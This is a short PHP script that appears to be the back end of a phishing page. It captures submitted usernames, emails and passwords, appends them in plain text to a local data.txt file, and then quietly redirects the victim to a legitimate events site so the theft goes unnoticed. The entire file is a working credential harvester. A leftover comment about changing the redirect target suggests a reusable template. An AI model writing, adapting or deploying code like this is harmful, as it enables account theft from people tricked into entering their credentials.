<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $username = isset($_POST['user']) ? $_POST['user'] : '';
    $email = isset($_POST['mail']) ? $_POST['mail'] : '';
    $password = isset($_POST['pass']) ? $_POST['pass'] : '';

    // Create a string with form data
    $formData = "Username: $username\nEmail: $email\nPassword: $password\n\n";

    // Path to the text file
    $filePath = 'data.txt';

    // Save form data to a text file (append mode)
    file_put_contents($filePath, $formData, FILE_APPEND | LOCK_EX);

    // Redirect back to the previous page or a specific page
    header("Location: https://allevents.in/hurghada"); // Change 'previous_page.php' to your desired page
    exit();
}
?>
